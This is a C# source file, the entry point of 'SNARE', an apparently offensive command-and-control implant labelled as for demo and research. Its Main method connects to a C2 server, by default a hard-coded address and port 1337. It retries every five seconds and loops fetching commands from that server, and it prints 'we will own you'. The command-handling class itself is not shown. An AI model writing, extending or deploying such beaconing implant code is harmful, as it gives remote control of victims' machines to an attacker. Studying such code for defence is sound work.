using System;
using System.Runtime.InteropServices;
using System.Threading;

// Sure Not Another Rancid Executable
namespace SnareNetStd
{
    class Program
    {
        #region Privates
        //From https://stackoverflow.com/questions/27987085/screen-resolution-not-matching-screen-bounds
        private enum ProcessDPIAwareness
        {
            ProcessDPIUnaware = 0,
            ProcessSystemDPIAware = 1,
            ProcessPerMonitorDPIAware = 2
        }

        [DllImport("shcore.dll")]
        private static extern int SetProcessDpiAwareness(ProcessDPIAwareness value);

        private static void SetDpiAwareness()
        {
            try
            {
                if (Environment.OSVersion.Version.Major >= 6)
                {
                    SetProcessDpiAwareness(ProcessDPIAwareness.ProcessPerMonitorDPIAware);
                }
            }
            catch (EntryPointNotFoundException)//this exception occures if OS does not implement this API, just ignore it.
            {
            }
        }
        #endregion

        static void Main(string[] args)
        {
            SetDpiAwareness();
            Console.WriteLine("SNARE - Surely Not Another Rancid Executable");
            Console.WriteLine("No license required, no liability accepted if something goes wrong.");
            Console.WriteLine("Created for demo and research purposes, don't do anything bad with it.");
            Console.WriteLine("Connecting to C2");
            Console.WriteLine("");

            Console.WriteLine("Usage: snare [IP] [PORT]");
            Console.WriteLine("Otherwise it defaults to us and we will own you.");

            C2Connection c2;
            try
            {
                
                if (args.Length == 2)
                {
                    c2 = new C2Connection(args[0].ToString(), int.Parse(args[1])); // Sets the Config ip/port as well
                }
                else
                {
                    c2 = new C2Connection("192.168.0.105", 1337);
                }
            }
            catch (FormatException e)
            {
                Console.WriteLine($"{args[1]} is not a port number.");
                return;
            }

            // While loop which allows for beconing.
            while (true)
            {
                try
                {
                    c2.Setup();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Connection Refused By C2");
                    Console.WriteLine("Waiting before reconnecting");
                    Thread.Sleep(5000);
                    continue;
                }

                while (true)
                {

                    if (c2.exitState)
                    {
                        Environment.Exit(0);
                    }

                    if (c2.waitState)
                    {
                        break;
                    }

                    c2.fetchCommand();


                }
                c2.tearDown();
                Thread.Sleep(5000);
            }

        }
    }

}
